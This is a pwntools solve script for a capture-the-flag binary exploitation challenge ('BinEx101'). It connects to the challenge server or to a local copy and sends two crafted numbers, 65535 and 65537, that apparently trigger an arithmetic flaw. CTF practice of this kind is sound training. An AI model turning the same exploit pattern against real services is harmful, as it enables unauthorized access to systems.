#!/usr/bin/env python


from pwn import *

BINARY = './BinEx101'
LIBC = './libc.so.6'
LD = './ld-2.27.so'
ADDR = 'challenge.acictf.com'
DOCKER = 'localhost'
PORT = 26435

splash()
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)
ld = ELF(LD, checksec=False)


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process([ld.path, elf.path], env={"LD_PRELOAD": libc.path},
                       stdin=pty, stdout=pty, stderr=pty)
    if args.PWNDBG:
        context.log_level = 'debug'
        context.terminal = ['tmux', 'splitw', '-h']
        return gdb.debug([ld.path, elf.path], env={"LD_PRELOAD": libc.path},
                         gdbscript='''init-pwndbg''')
    if args.DOCKER:
        return remote(DOCKER, PORT)
    else:
        return remote(ADDR, PORT)


def solve():
    io = conn()

    first_divisor = '65535'
    second_divisor= '65537'

    io.recvuntil('Give me a number:\r\n')
    io.sendline(first_divisor)
    io.recvuntil('Give me another number:\r\n')
    io.sendline(second_divisor)

    print(io.recvall())


if __name__ == "__main__":
    solve()
